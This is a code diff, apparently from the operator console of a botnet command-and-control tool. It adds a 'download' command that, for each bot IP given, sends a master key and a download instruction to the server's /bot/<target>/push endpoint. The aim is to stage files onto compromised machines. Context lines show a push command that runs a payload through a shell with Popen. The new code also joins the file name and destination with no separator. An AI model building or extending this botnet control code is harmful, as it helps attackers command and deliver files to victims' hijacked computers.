@@ -210,7 +210,7 @@ ___  ___          _              _____                       _
     @cmd2.with_argparser(push_parser)
     def do_push(self, args):
         target_list = args.target.split(",")
-        print("[DEBUG] target_list = ", target_list)
+        #print("[DEBUG] target_list = ", target_list)
 
         for target in target_list:
             url = URL + '/bot/' + target + '/push'
@@ -232,22 +232,40 @@ ___  ___          _              _____                       _
                 #print("[*] payload = ", payload)
                 process = Popen(payload, shell=True)
 
-    broadcast_parser = argparse.ArgumentParser()
-    broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
 
+    """
+    Command: Download
+    Description: Download a specific file from the server to the destination file path in agent's filesystem 
+    """
     download_parser = argparse.ArgumentParser()
     download_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to download the command")
     download_parser.add_argument('-f', '--file', type=str, help="Target file to be downloaded to the bot")
-    
+    download_parser.add_argument('-d', '--destination', type=str, help="Destination file path which the file will be downloaded to")
+
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(download_parser)
     def do_download(self, args):
-        pass 
+        target_list = args.target.split(",")
+
+        for target in target_list:
+            url = URL + '/bot/' + target + '/push'
+            masterkey = MASTERKEY
+            cmd = "download " + args.file + args.destination 
+
+            data = {'masterkey': masterkey, 'cmd': cmd}
+            res = requests.post(url, data=data)
+
+            output_push = ansi.style("[+] Download file staged for: " + target, fg='green', bold=True)
+
+            self.poutput(output_push)
+            self.poutput(res.text)
 
     """
     Command: Broadcast 
     Description: Issue a specific command to all of the bots in the server database 
     """
+    broadcast_parser = argparse.ArgumentParser()
+    broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(broadcast_parser)
     def do_broadcast(self, args):
